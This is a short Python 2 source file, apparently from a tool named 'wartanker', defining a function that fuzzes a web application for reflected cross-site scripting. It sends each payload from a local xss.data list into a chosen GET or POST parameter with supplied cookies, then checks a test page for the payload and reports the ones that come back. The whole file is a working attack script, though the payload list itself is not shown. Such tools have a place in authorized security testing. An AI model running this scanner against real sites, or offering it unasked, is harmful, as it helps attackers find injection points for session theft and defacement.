import requests

def xss_exploit(method, URL, name, param, cookie, testurl):
    # met=True: get, met=False: post
    if (method[:1].lower() == 'g'):
        met = True
    else:
        met = False
    
    file = open('./wartanker/xss.data')
    data = file.read().split('\n')
    data_len = len(data)
    for i in range (data_len):
        param[name] = data[i]
        if (met):
            requests.get(URL, cookies=cookie, params=param)
        else:
            requests.post(URL, cookies=cookie, data=param)
        
        res = requests.get(testurl, cookies=cookie).text
        print '[*] trying ' + str(i) + ' of ' + str(data_len)
        if data[i] in res:
            print '[*] How about trying \'' + data[i] + '\'?'
            more = raw_input('[*] Do you want more? [Y / N] ')
            if (more.lower() != 'y'):
                break
